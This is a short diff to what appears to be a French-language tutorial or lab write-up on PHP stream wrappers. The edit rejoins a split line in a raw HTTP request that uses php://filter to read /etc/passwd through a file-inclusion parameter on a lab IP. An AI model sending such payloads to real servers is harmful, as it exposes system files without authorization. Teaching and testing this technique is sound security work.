@@ -81,8 +81,7 @@ Connection: close
 Au lieu de :&#x20;
 
 ```
-GET /wrappers.php?file=php://filter/read=/resource=file:///etc/
-passwd HTTP/1.1
+GET /wrappers.php?file=php://filter/read=/resource=file:///etc/passwd HTTP/1.1
 Host: 192.168.56.122
 Connection: close
 Content-Length: 22
